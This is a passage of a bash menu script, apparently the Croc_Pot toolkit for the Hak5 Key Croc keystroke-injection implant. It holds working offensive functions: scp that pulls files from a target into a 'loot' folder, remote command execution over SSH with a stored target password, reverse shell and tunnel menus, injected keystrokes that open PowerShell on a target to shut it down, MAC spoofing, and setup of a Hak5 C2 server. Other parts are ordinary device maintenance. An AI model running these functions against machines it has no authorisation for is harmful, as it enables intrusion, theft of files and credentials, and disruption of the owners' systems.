			read_all 'ENTER THE FULL PATH OF FILE TO SEND AND PRESS [ENTER]' ; local c_f="$r_a"
			if [ -e "$c_f" ]; then
				read_all 'ENTER REMOTE HOST_NAME AND PRESS [ENTER]' ; local r_n="$r_a"
				scp -o "StrictHostKeyChecking no" "$c_f" "$r_n"@"$r_h":~/
			else
				ColorRed 'File does not exist\n' ; invalid_entry
			fi
		fi
	else
		ColorRed 'Not a valid ip address\n' ; invalid_entry
	fi
}
##
#----SSH Receive Remote File from remote target/host
##
remote_host() {
	Info_Screen '-Receive file from remote host to keycroc
-Save to keycroc loot/Croc_Pot
-Will need to know the path of file on remote host'
	read_all 'ENTER REMOTE HOST IP AND PRESS [ENTER]' ; local r_h="$r_a"
	if [[ "$r_h" =~ $validate_ip ]]; then
		ping -q -c 1 -w 1 "$r_h" &>/dev/null 2>&1
		if [[ $? -ne 0 ]]; then
			ColorRed 'Unable to reach host\n'
		elif [[ "${#args[@]}" -eq 0 ]]; then
			read_all 'ENTER REMOTE HOST_NAME AND PRESS [ENTER]' ; local r_n="$r_a"
			ssh -o "StrictHostKeyChecking no" "$r_n"@"$r_h" 'for dir in {bin,boot,dev,etc,home,lib,lost+found,media,mnt,proc,root,run,sbin,srv,sys,tmp,usr,var,opt}; do count=$(find "/$dir" 2>/dev/null | wc -l); if [ $? -eq 0 ]; then printf "'"$yellow"'Directory: '"$cyan"'/%s'"$yellow"' Contains: '"$green"'%s'"$yellow"' files.\n'"$clear"' " "$dir" "$count"; fi; done'
			read_all 'ENTER THE DIRECTORY NAME TO VIEW FILES AND PRESS [ENTER]' ; local r_f="$r_a"
			ssh "$r_n"@"$r_h" 'f=`sudo find /"$r_f" -type f -name "*.*"`' ; ColorGreen "$f\n"
			read_all 'ENTER THE FULL PATH OF FILE TO RECEIVE AND PRESS [ENTER]'
			ssh "$r_n"@"$r_h" 'test -e "$r_a"'
			if [ $? -eq 0 ]; then
				scp "$r_n"@"$r_h":"$r_a" /root/udisk/loot/Croc_Pot
			else
				ColorRed 'File does not exist\n' ; invalid_entry
			fi
		fi
	else
		ColorRed 'Not a valid ip address\n' ; invalid_entry
	fi
}
##
#----SSH Remote File with scp Command menu
##
	MenuTitle 'REMOTE FILE MENU'
	MenuColor 21 1 'KEYCROC TO TARGET'
	MenuColor 21 2 'TARGET TO KEYCROC'
	MenuColor 21 3 'SEND TO REMOTE HOST'
	MenuColor 21 4 'RECEIVE REMOTE HOST'
	MenuColor 21 5 'RETURN TO MAIN MENU'
	MenuEnd 20
	case "$m_a" in
		1) keycroc_target ; remote_file ;;
		2) target_keycroc ; remote_file ;;
		3) user_file ; remote_file ;;
		4) remote_host ; remote_file ;;
		5) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ; remote_file ;;
		[pP]) Panic_button ;; [bB]) croc_reverse_shell ;; *) invalid_entry ; remote_file ;;
	esac
}
##
#----SSH Execute a remote command on a host over SSH
##
remote_command() {
	Info_Screen '-Execute a remote command over SSH
-Example: ssh root@192.168.1.1 uptime
-ssh USER@HOST COMMAND1; COMMAND2; COMMAND3 or
-ssh USER@HOST COMMAND1 | COMMAND2 | COMMAND3
-SSH between remote hosts and get back the output'
target_command() {
	read_all 'ENTER COMMAND AND PRESS [ENTER]' ; local USER_COMMAND="$r_a"
	ssh -o "StrictHostKeyChecking no" "$1"@"${@:2}" "$USER_COMMAND"
	sleep 5
}
input_command() {
	read_all 'ENTER TARGET USERNAME AND PRESS [ENTER]' ; local USERNAME_COMMAND="$r_a"
	read_all 'ENTER TARGET IP AND PRESS [ENTER]' ; local IP_COMMAND="$r_a"
	read_all 'ENTER COMMAND AND PRESS [ENTER]' ; local USER_COMMAND="$r_a"
	ssh -o "StrictHostKeyChecking no" "$USERNAME_COMMAND"@"$IP_COMMAND" "$USER_COMMAND"
	sleep 5
}
pc_target_command() {
	read_all 'ENTER COMMAND AND PRESS [ENTER]' ; local USER_COMMAND="$r_a"
	if [ -f "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
		sshpass -p "$(target_pw)" ssh -o "StrictHostKeyChecking no" "$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)"@"$(os_ip)" "$USER_COMMAND"
		sleep 5
	else
		ssh -o "StrictHostKeyChecking no" "$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)"@"$(os_ip)" "$USER_COMMAND"
		sleep 5
	fi
}
##
#----SSH remote command Menu
##
command_menu() {
	MenuTitle 'REMOTE COMMAND MENU'
	MenuColor 24 1 'COMMAND TO TARGET'
	MenuColor 24 2 'USERNAME/IP AND COMMAND'
	MenuColor 24 3 'COMMAND TO SQUIRREL'
	MenuColor 24 4 'COMMAND TO TURTLE'
	MenuColor 24 5 'COMMAND TO SHARK'
	MenuColor 24 6 'COMMAND TO BUNNY'
	MenuColor 24 7 'RETURN TO MAIN MENU'
	MenuEnd 23
	case "$m_a" in
		1) pc_target_command ; command_menu ;;
		2) input_command ; command_menu ;;
		3) target_command root 172.16.32.1 ; command_menu ;;
		4) target_command root 172.16.84.1 ; command_menu ;;
		5) shark_check ; target_command root "$DEFAULT_IP" ; command_menu ;;
		6) target_command root localhost -p 7000 ; command_menu ;;
		7) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ; remote_command ;;
		[pP]) Panic_button ;; [bB]) croc_reverse_shell ;; *) invalid_entry ; remote_command ;;
	esac
}
command_menu
}
##
#----SSH croc reverse shell Menu
##
	MenuTitle 'REVERSE SSH TUNNEL MENU'
	MenuColor 24 1 'REVERSE TUNNEL NETCAT'
	MenuColor 24 2 'CROC LISTENING'
	MenuColor 24 3 'REVERSE TUNNEL TARGET'
	MenuColor 24 4 'REVERSE SSH TUNNEL VPS'
	MenuColor 24 5 'REMOTE COMMANDS TARGETS'
	MenuColor 24 6 'SEND FILE WITH SCP'
	MenuColor 24 7 'RETURN TO MAIN MENU'
	MenuEnd 23
	case "$m_a" in
		1) remote_listener ; croc_reverse_shell ;;
		2) croc_listener ; croc_reverse_shell ;;
		3) shell_pc ; croc_reverse_shell ;;
		4) ssh_tunnel ;;
		5) remote_command ;;
		6) remote_file ;;
		7) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ; croc_reverse_shell ;;
		[pP]) Panic_button ;; [bB]) ssh_menu ;; *) invalid_entry ; croc_reverse_shell ;;
	esac
}
##
#----SSH main Menu
## 
	MenuTitle 'CROC POT SSH MENU'
	MenuColor 18 1 'SSH TARGET' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 20 7 'LAN TURTLE' | sed 's/\t//g'
	MenuColor 18 2 'SSH USER INPUT' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 20 8 'SIGNAL OWL' | sed 's/\t//g'
	MenuColor 18 3 'START SSH SERVICE' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 20 9 'SHARK JACK' | sed 's/\t//g'
	MenuColor 18 4 'STOP SSH SERVICE' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 19 10 'BASH BUNNY' | sed 's/\t//g'
	MenuColor 18 5 'WIFI PINEAPPLE MK7' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 19 11 'REVERSE SHELL MENU' | sed 's/\t//g'
	MenuColor 18 6 'PACKET SQUIRREL' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 19 12 'PUBLIC/PRIVATE KEY' | sed 's/\t//g'
	MenuColor 19 13 'RETURN TO MAIN MENU'
	MenuEnd 19
	case "$m_a" in
		1) pc_ssh ; ssh_menu ;;
		2) ColorYellow 'Reachable target on local network:\n' ; reachable_target ; userinput_ssh ; ssh_menu ;;
		3) systemctl restart ssh.service ; ssh_menu ;;
		4) systemctl stop sshd.service ; ssh_menu ;;
		5) ssh_pineapple ;;
		6) ssh_squirrel ; ssh_menu ;;
		7) ssh_turtle ; ssh_menu ;;
		8) ssh_owl ; ssh_menu ;;
		9) ssh_shark ; ssh_menu ;;
		10) ssh_bunny ; ssh_menu ;;
		11) croc_reverse_shell ;;
		12) ssh_keygen ; ssh_menu ;;
		13) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ; ssh_menu ;;
		[pP]) Panic_button ;; [bB]) main_menu ;; *) invalid_entry ; ssh_menu ;;
	esac
}
##
#----Keycroc recovery menu/function
##
function croc_recovery() {
	Info_Screen '-Download/install The latest firmware from Hak5
-This will save the Firmware to root of the KeyCroc drive
-Restore the keycroc firmware with the latest firmware
-Keycroc-docs @ https://docs.hak5.org/key-croc/
-Change timezone'
##
#----Download latest keycroc firmware save to /root/udisk
##
croc_firmware() {
	Info_Screen '-This will Download KeyCroc latest firmware from Hak5
Download center and place on root of the KeyCroc drive
-Download may take some time
-This will Verify sha256 checksum after download
-223a44303c6e94caa0bd0b8d3cabad2b2faf020c1c40ab5bffe176871c882641
-After download unplug keycroc plug back in
-Wait until the LED RED & BLUE stop flashing'
if [ -e udisk/kc_fw_1.4_568.tar.gz ]; then
	ColorGreen 'KeyCroc latest firmware file already exists\n'
else
	read_all 'DOWNLOAD/INSTALL LATEST KEYCROC FIRMWARE Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			ColorYellow '-Downloading KeyCroc latest firmware\n'
			wget https://storage.googleapis.com/hak5-dl.appspot.com/keycroc/firmwares/1.4-stable/kc_fw_1.4_568.tar.gz -P udisk
			ColorYellow '\nVerifying SHA256 Checksum with sha256sum command\n'
			local CrocFirmware="223a44303c6e94caa0bd0b8d3cabad2b2faf020c1c40ab5bffe176871c882641"
			local ckeckFirmware=$(sha256sum udisk/kc_fw_1.4_568.tar.gz | awk '{print $1}')
			if [[ "$CrocFirmware" == "$ckeckFirmware" ]]; then
				LED G
				ColorGreen 'SHA-256 checksum match it is safe to install Firmware unplug keycroc plug back in\n'
			else
				LED R
				ColorRed 'SHA-256 checksum DID NOT match it is not safe to install Firmware removing kc_fw_1.4_568.tar.gz\n'
				rm -f udisk/kc_fw_1.4_568.tar.gz
			fi ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
fi
}
##
#----recovery repair locale LANG=en_US.UTF-8
##
locale_en_US() {
	Info_Screen '-This will fix LC_ALL=en_US.UTF-8 if running into this error at ssh 
-bash: warning: setlocale: LC_ALL: cannot change locale en_US.UTF-8
-This is for US language
-Not sure if this will work on other language keyboards'
	read_all 'FIX THE ERROR Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			ColorGreen 'Repairing The error\n'
			echo "LC_ALL=en_US.UTF-8" >> /etc/environment
			echo "en_US.UTF-8 UTF-8" >> /etc/locale.gen
			echo "LANG=en_US.UTF-8" > /etc/locale.conf
			locale-gen en_US.UTF-8
			ColorGreen 'Done Repairing The error unplug the keycroc and plug back in\n' ;;
		[nN] | [nN][oO])
			ColorYellow 'Returning back to menu\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Remove Croc_Pot and all its contents
##
remove_croc_pot() {
	Info_Screen '-Completely remove Croc_Pot and all its contents from the KeyCroc'
	ColorRed 'ARE YOU SURE TO REMOVE CROC_POT TYPE YES OR NO AND PRESS [ENTER]:\n'
	read_all 'YES OR NO AND PRESS [ENTER]'
	case "$r_a" in
		YES)
			apt -y remove unzip openvpn mc nmon sshpass screenfetch whois dnsutils sslscan speedtest-cli host hping3 stunnel ike-scan wamerican-huge rlwrap iptraf-ng macchanger jq
			rm -r /var/hak5c2 /root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot/Bunny_Payload_Shell /root/udisk/tools/Croc_Pot /root/udisk/payloads/Croc_Lockout.txt
			rm /usr/local/bin/c2-3.4.0_armv7_linux /etc/systemd/system/hak5.service /root/udisk/payloads/Croc_Redirect.txt /root/udisk/payloads/Restricted_words.txt
			rm /root/udisk/tools/kc_fw_1.4_568.tar.gz /root/udisk/payloads/Croc_Pot_Payload.txt /root/udisk/payloads/Croc_Bite.txt.txt /usr/local/bin/cht.sh /root/udisk/payloads/Delete_Char.txt
			rm /root/udisk/payloads/Croc_unlock.txt /root/udisk/payloads/No_Sleeping.txt /root/udisk/payloads/Croc_close_it.txt /root/udisk/payloads/Croc_getonline.txt
			rm /root/udisk/payloads/Quick_Start_C2.txt /root/udisk/payloads/Croc_replace.txt /root/udisk/payloads/Live_keystroke.txt /root/udisk/payloads/Email_Capture.txt
			rm /root/udisk/payloads/Quick_start_Croc_Pot.txt /root/udisk/payloads/Croc_Force_payload.txt /root/udisk/payloads/Keyboard_Killer.txt /root/udisk/tools/target_email.txt
			rm /root/udisk/tools/Croc_Pot/Croc_OS.txt /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/payloads/Croc_Defender.txt /root/udisk/payloads/Quack_Attack.txt
			rm /root/udisk/tools/Croc_Pot.sh /root/udisk/payloads/Croc_Shot.txt /root/udisk/payloads/Croc_Shell.txt /root/udisk/payloads/Double_up.txt /root/udisk/payloads/Croc_Attackmode.txt
			apt-get autoremove
			exit ;;
		[nN] | [nN][oO])
			ColorYellow 'Return Back to main menu\n' ; main_menu ;;
		*)
			invalid_entry ; remove_croc_pot
	esac
}
##
#----Keycroc apt update/upgrade Packages
##
croc_update() {
	Info_Screen '-Update/Upgrade KeyCroc Packages
-NOTE: This could break important Packages the keycroc needs to work properly

Edit (/etc/apt/sources.list) fix package fail to install

deb [trusted=yes] http://archive.debian.org/debian/ jessie-backports main
#deb-src http://archive.debian.org/debian/ jessie-backports main
deb [trusted=yes] http://archive.debian.org/debian jessie main contrib non-free
#deb-src http://httpredir.debian.org/debian jessie main contrib non-free'
	read_all 'UPDATE KEYCROC PACKAGES Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			ColorGreen 'UPDATING AND UPGRADING THE KEYCROC PACKAGES\n'
			apt update && apt upgrade -y ;;
		[nN] | [nN][oO])
			ColorYellow 'RETURING BACK TO MENU\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Recovery Reboot/Shutdown target
##
reboot_shutdown() {
	Info_Screen '-Reboot or shutdown Target'
##
#----Recovery Shutdown target
##
shutdown_pc() {
	if [ "$(OS_CHECK)" = WINDOWS ]; then
		QUACK GUI d ; QUACK GUI r ; sleep 1 ; QUACK STRING "powershell" ; QUACK ENTER ; sleep 2 ; QUACK STRING "Stop-Computer -ComputerName localhost" ; QUACK ENTER
	else
		case "$HOST_CHECK" in
			raspberrypi)
				QUACK CONTROL-ALT-t ; sleep 1 ; QUACK STRING "shutdown -h 0" ; QUACK ENTER ;;
			"$HOST_CHECK")
				QUACK ALT-t ; QUACK ENTER ; sleep 1 ; QUACK STRING "shutdown -h 0" ; QUACK ENTER ;;
			*)
				QUACK ALT F2 ; sleep 1 ; QUACK STRING "xterm" ; QUACK ENTER ; sleep 1 ; QUACK STRING "shutdown -h 0" ; QUACK ENTER ;;
		esac
	fi
}
##
#----Recovery Reboot target
##
reboot_pc() {
	if [ "$(OS_CHECK)" = WINDOWS ]; then
		QUACK GUI d ; QUACK GUI r ; sleep 1 ; QUACK STRING "powershell" ; QUACK ENTER ; sleep 2 ; QUACK STRING "Restart-Computer" ; QUACK ENTER
	else
		case "$HOST_CHECK" in
			raspberrypi)
				QUACK CONTROL-ALT-t ; sleep 1 ; QUACK STRING "shutdown -r 0" ; QUACK ENTER ;;
			"$HOST_CHECK")
				QUACK ALT-t ; QUACK ENTER ; sleep 1 ; QUACK STRING "shutdown -r 0" ; QUACK ENTER ;;
			*)
				QUACK ALT F2 ; sleep 1 ; QUACK STRING "xterm" ; QUACK ENTER ; sleep 1 ; QUACK STRING "shutdown -r 0" ; QUACK ENTER ;;
		esac
	fi
}
##
#----Recovery Reboot/Shutdown menu
##
	MenuTitle 'REBOOT/SHUTDOWN TARGET'
	MenuColor 19 1 'SHUTDOWN TARGET'
	MenuColor 19 2 'REBOOT TARGET'
	MenuColor 19 3 'REBOOT KEYCROC'
	MenuColor 19 4 'RETURN TO MAIN MENU'
	MenuEnd 18
	case "$m_a" in
		1) shutdown_pc ;;
		2) reboot_pc ;;
		3) reboot --force ;;
		4) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ; reboot_shutdown ;;
		[bB]) croc_recovery ;; [pP]) Panic_button ;; *) invalid_entry ; reboot_shutdown ;;
	esac
}
##
#----Set Keycroc clock to timezone
##
croc_clock() {
	Info_Screen '-Set keycroc clock to your timezone
-To view all available time zones, use the timedatectl command
      timedatectl list-timezones
Example change the system timezone to America/New_York type:
      timedatectl set-timezone America/New_York'
	ColorYellow 'Keycroc current timezone:\n'
	timedatectl
	read_all 'TIMEZONE LIST [L] CHANGE TIMEZONE [C] CURRENT TIMEZONE [V] AND PRESS [ENTER]'
	case "$r_a" in
		[lL])
			timedatectl list-timezones ;;
		[cC])
			ColorYellow 'Enter timezone location Example: America/New_York\n'
			read_all 'ENTER TIMEZONE LOCATION AND PRESS [ENTER]'
			timedatectl set-timezone "$r_a" ; croc_timezone="$r_a" ;;
		[vV])
			timedatectl ;;
		*)
			invalid_entry ;;
	esac
}
##
#----install macchanger and change keycroc mac address
##
mac_changer() {
	Info_Screen '-Install macchanger and change keycroc mac address
-Return to original MAC address unplug keycroc plug back in

[R]-Randomly Change the MAC Address
[M]-Manually Change the MAC Address
[S]-Restore Original Mac Address
[N]-Return back to menu

-Run on target local shell terminal
-Requirements: macchanger
https://github.com/alobbs/macchanger'
if [ -f "/root/udisk/tools/Croc_Pot/croc_original_mac.txt" ]; then
	local original_mac="$(sed -n 1p /root/udisk/tools/Croc_Pot/croc_original_mac.txt)"
else
	cat /sys/class/net/"$(ip route show default | awk '/default/ {print $5}')"/address > /root/udisk/tools/Croc_Pot/croc_original_mac.txt 2>/dev/null
	local original_mac="$(sed -n 1p /root/udisk/tools/Croc_Pot/croc_original_mac.txt)"
fi
	install_package macchanger MAC_CHANGER
	ColorYellow "$(macchanger -V | grep "GNU MAC" | sed 's/[^ ]* *//')\n"
	ColorYellow "ORIGINAL MAC: $(ColorGreen "$original_mac")\n"
	ColorYellow "$(macchanger -s wlan0)\n\n"
	read_all '[R]-RANDOMLY [M]-MANUALLY [S]-RESTORE [N]-NONE PRESS [ENTER]'
	case "$r_a" in
	[rR])
		echo -ne "#!/bin/bash
Q STRING \"PID_WPA=\\\$(pidof wpa_supplicant)\" ; Q ENTER
Q STRING \"PID_DHC=\\\$(pidof dhclient)\" ; Q ENTER
Q STRING \"ifconfig wlan0 down && macchanger -r wlan0 && ifconfig wlan0 up && kill -9 \\\$PID_WPA && kill -9 \\\$PID_DHC && wpa_supplicant -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf -B && dhclient wlan0 && sleep 2 && \" 
Q STRING \"Q STRING \\\"ssh -o 'StrictHostKeyChecking no' root@\\\$(ifconfig wlan0 | grep \\\"inet addr\\\" | awk '{print \\\$2}' | cut -c 6-)\\\" && sleep 1 && Q ENTER & sleep 1 && exit\"\nQ ENTER" > /tmp/mac_changer.sh
		chmod +x /tmp/mac_changer.sh
		cat /tmp/mac_changer.sh
		sleep 1
		bash /tmp/mac_changer.sh && exit & ;;
	[mM])
		read_all 'ENTER MAC ADDRESS AND PRESS [ENTER]'
		echo -ne "#!/bin/bash
Q STRING \"PID_WPA=\\\$(pidof wpa_supplicant)\" ; Q ENTER
Q STRING \"PID_DHC=\\\$(pidof dhclient)\" ; Q ENTER
Q STRING \"ifconfig wlan0 down && macchanger -m ${r_a} wlan0 && ifconfig wlan0 up && kill -9 \\\$PID_WPA && kill -9 \\\$PID_DHC && wpa_supplicant -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf -B && dhclient wlan0 && sleep 2 && \" 
Q STRING \"Q STRING \\\"ssh -o 'StrictHostKeyChecking no' root@\\\$(ifconfig wlan0 | grep \\\"inet addr\\\" | awk '{print \\\$2}' | cut -c 6-)\\\" && sleep 1 && Q ENTER & sleep 1 && exit\"\nQ ENTER" > /tmp/mac_changer.sh
		chmod +x /tmp/mac_changer.sh
		cat /tmp/mac_changer.sh
		sleep 1
		bash /tmp/mac_changer.sh && exit & ;;
	[sS])
		echo -ne "#!/bin/bash
Q STRING \"PID_WPA=\\\$(pidof wpa_supplicant)\" ; Q ENTER
Q STRING \"PID_DHC=\\\$(pidof dhclient)\" ; Q ENTER
Q STRING \"ifconfig wlan0 down && macchanger -m ${original_mac} wlan0 && ifconfig wlan0 up && kill -9 \\\$PID_WPA && kill -9 \\\$PID_DHC && wpa_supplicant -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf -B && dhclient wlan0 && sleep 2 && \" 
Q STRING \"Q STRING \\\"ssh -o 'StrictHostKeyChecking no' root@\\\$(ifconfig wlan0 | grep \\\"inet addr\\\" | awk '{print \\\$2}' | cut -c 6-)\\\" && sleep 1 && Q ENTER & sleep 1 && exit\"\nQ ENTER" > /tmp/mac_changer.sh
		chmod +x /tmp/mac_changer.sh
		cat /tmp/mac_changer.sh
		sleep 1
		bash /tmp/mac_changer.sh && exit & ;;
	[nN])
		ColorYellow 'Returning to menu' ;;
	*)
		invalid_entry ;;
	esac
}
##
#----Reset Wireless Networking
##
reset_wifi() {
	Info_Screen 'Reset Wireless Networking
NOTE: may get assigned a new ip address'
	SSID_CHECK
	read_all 'RESET WIRELESS NETWORK Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			kill -9 $(pidof wpa_supplicant) && kill -9 $(pidof dhclient)
			ifconfig wlan0 down && ifconfig wlan0 up
			wpa_supplicant -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf -B && dhclient wlan0
			sleep 3
			systemctl restart ssh.service
			[ : >/dev/tcp/8.8.8.8/53 ] && LED FINISH || LED R ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Get all established connections, extract IP address and port number, terminate the connection (if a PID was found)
##
terminate_ip() {
	Info_Screen 'Get all established connections
ask user which connection to terminate
extract IP address and port number from user input
find the process ID (PID) of the connection to terminate
terminate the connection (if a PID was found)'
	read_all 'SHOW ESTABLISHED CONNECTIONS Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			netstat -tn 2>/dev/null | grep ESTABLISHED | awk '{print $5}' | sort -t: -k2 | uniq |
			while read ip; do
				port=$(echo "$ip" | cut -d: -f2)
				ip=$(echo "$ip" | cut -d: -f1)
				ColorYellow "$ip:$port\n"
			done
			read_all 'TERMINATE ESTABLISHED CONNECTIONS Y/N AND PRESS [ENTER]'
			case "$r_a" in
				[yY] | [yY][eE][sS])
					read_all 'ENTER IP:PORT OF CONNECTION TO TERMINATE AND PRESS [ENTER]' ; connection="$r_a"
					ip=$(echo "$connection" | cut -d: -f1)
					port=$(echo "$connection" | cut -d: -f2)
					pid=$(netstat -tnp 2>/dev/null | grep -E "$ip:$port\s" | cut -d/ -f1 | awk '{print $NF}')
					if [ ! -z "$pid" ]; then
						kill -9 "$pid"
						ColorYellow "Connection to $connection terminated.\n"
						read_all 'BLOCK ALL CONNECTION UNTILL REBOOT Y/N AND PRESS [ENTER]'
						case "$r_a" in
							[yY] | [yY][eE][sS])
								iptables -A INPUT -s $ip -j DROP
								iptables -A OUTPUT -d $ip -j DROP
								ColorYellow "All Connection to $ip terminated untill reboot.\n" ;;
							[nN] | [nN][oO])
								ColorYellow 'Maybe next time\n' ;;
							*)
								invalid_entry ;;
						esac
					else
						ColorYellow "No connection to $connection found."
					fi ;;
				[nN] | [nN][oO])
					ColorYellow 'Maybe next time\n' ;;
				*)
					invalid_entry ;;
			esac ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Reformat the keycroc udisk, udisk partition is formatted in the FAT32 file system
##
reformat_udisk() {
	Info_Screen 'Reformat the Keycroc udisk partition
The udisk partition is formatted in the FAT32 file system for maximum
compatibility with various targets Windows, Mac, Linux, etc.

NOTE: This will remove anything you previously have stored on the udisk
such as payloads, loot, etc.'
df -h /root/udisk
	read_all 'REFORMAT KEYCROC UDISK PARTITION Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			ColorRed 'Reformat the Keycroc udisk partition\n'
			ColorYellow 'May need to unplug keycroc and plug back in\n'
			udisk reformat ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Recovery main menu
##
	MenuTitle 'KEYCROC RECOVERY MENU'
	MenuColor 27 1 'DOWNLOAD LATEST FIRMWARE'
	MenuColor 27 2 'KEYCROC DOCS.HAK5 WEBSITE'
	MenuColor 27 3 'REPAIR en_US.UTF-8 ERROR'
	MenuColor 27 4 'KEYCROC UPDATE PACKAGES'
	MenuColor 27 5 'REMOVE CROC_POT AN CONTENTS'
	MenuColor 27 6 'REBOOT/SHUTDOWN TARGET'
	MenuColor 27 7 'CHANGE KEYCROC TIMEZONE'
	MenuColor 27 8 'CHANGE KEYCROC PASSWORD'
	MenuColor 27 9 'MAC ADDRESS CHANGER'
	MenuColor 26 10 'RESET WIRELESS NETWORK'
	MenuColor 26 11 'TERMINATE CONNECTION'
	MenuColor 26 12 'REFORMAT UDISK PARTITION'
	MenuColor 26 13 'RETURN TO MAIN MENU'
	MenuEnd 26
	case "$m_a" in
		1) croc_firmware ; croc_recovery ;;
		2) websites=("https://docs.hak5.org/key-croc/" "https://forums.hak5.org/" "https://shop.hak5.org/" "https://discord.com/invite/QfmZFTyTY2")
			for url in "${websites[@]}"; do
				start_web "$url" ; sleep 3
			done ; croc_recovery ;;
		3) locale_en_US ; croc_recovery ;;
		4) croc_update ; croc_recovery ;;
		5) remove_croc_pot ;;
		6) reboot_shutdown ;;
		7) croc_clock ; croc_recovery ;;
		8) passwd ; croc_recovery ;;
		9) mac_changer ; croc_recovery ;;
		10) reset_wifi ; croc_recovery ;;
		11) terminate_ip ; croc_recovery ;;
		12) reformat_udisk ; croc_recovery ;;
		13) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ; croc_recovery ;;
		[bB]) main_menu ;; [pP]) Panic_button ;; *) invalid_entry ; croc_recovery ;;
	esac
}
##
#----Hak5 Cloud_C2 menu/function
##
function hak_cloud() {
	Info_Screen 'Run HAK5 Cloud C2 on the keycroc
-When running setup, maximize the screen to read Token keys properly
-To get Token keys Run #3 RELOAD HAK5 C2 until the keys show up
-May need to Unplug the keycroc plug back in and try again
-This will check to see if unzip is installed if not install it
-This will not start C2 on boot Next reboot run #4 RESTART HAK5 C2
-ON any device type in the keycroc IP into any web browser url,
-Device must be on same network as the keycroc and then to connect HAK5 C2'
	if [ -e /var/hak5c2 ]; then
		ColorYellow "HAK5 Cloud C2 is installed\nVER: $(ColorGreen "$(ls /usr/local/bin | grep c2-)")\n"
		systemctl status hak5.service
	else
		ColorYellow 'HAK5 Cloud C2 is not installed\n'
	fi
##
#----Hak5 Cloud_C2- start default web browser on Hak5 Cloud_C2 url
##
cloud_web() {
	start_web http://"$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)"
}
##
#----Hak5 Cloud_C2- download and install Hak5 Cloud_C2 & unzip
##
cloud_setup() {
	read_all 'DOWNLOAD AND INSTALL CLOUD C2 AND UNZIP Y/N AND PRESS [ENTER]'
case "$r_a" in
	[yY] | [yY][eE][sS])
		install_package unzip UNZIP
		if [ -e /var/hak5c2 ]; then
			ColorYellow 'HAK5 C2 is already installed on the keycroc\n'
		else
			ColorGreen 'Installing HAK5 C2 on the keycroc\n'
			sleep 3
			wget https://storage.googleapis.com/hak5-dl.appspot.com/cloudc2/firmwares/3.4.0-stable/c2-3.4.0.zip -O /tmp/community && unzip /tmp/community -d /tmp ; sleep 5
			mv /tmp/c2-3.4.0_armv7_linux /usr/local/bin && mkdir /var/hak5c2
			echo -ne "[Unit]\nDescription=Hak5 C2\nAfter=hak5.service\n[Service]\nType=idle
ExecStart=/usr/local/bin/c2-3.4.0_armv7_linux -hostname $(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-) -listenport 80 -db /var/hak5c2/c2.db
[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/hak5.service
			sleep 1
			systemctl daemon-reload && systemctl start hak5.service ; sleep 5
			systemctl status hak5.service ; sleep 5
			ColorGreen 'HAK-5 Cloud C2 Installed, Starting C2 web UI\n' ; sleep 5
			cloud_web
		fi ;;
	[nN] | [nN][oO])
		ColorYellow 'Maybe next time\n' ;;
	*)
		invalid_entry ;;
esac
}
##
#----Hak5 Cloud_C2 reload
##
reload_cloud() {
	systemctl daemon-reload && systemctl start hak5.service
	sleep 5
	systemctl status hak5.service
	sleep 5
}
##
#----Hak5 Cloud_C2- remove Hak5 Cloud_C2 off keycroc
##
remove_cloud() {
	rm -r /var/hak5c2
	rm /usr/local/bin/c2-3.4.0_armv7_linux
	rm /etc/systemd/system/hak5.service
}
##
#----Quick start Cloud_C2 (payload)
##
quick_cloud() {
	local quickcloud=/root/udisk/payloads/Quick_Start_C2.txt
	Info_Screen '-Will need to install Cloud C2 first on the keycroc
-This will install Quick_Start_C2.txt in the payload folder
-Use this to start C2 from a payload
-Type in startc2 this will automatically start Hak5 cloud C2'
if [ -f "$quickcloud" ]; then
	ColorGreen 'Quick_Start_C2.txt already exist check payloads folder\n'
else
	read_all 'INSTALL QUICK START CLOUD C2 PAYLOAD Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
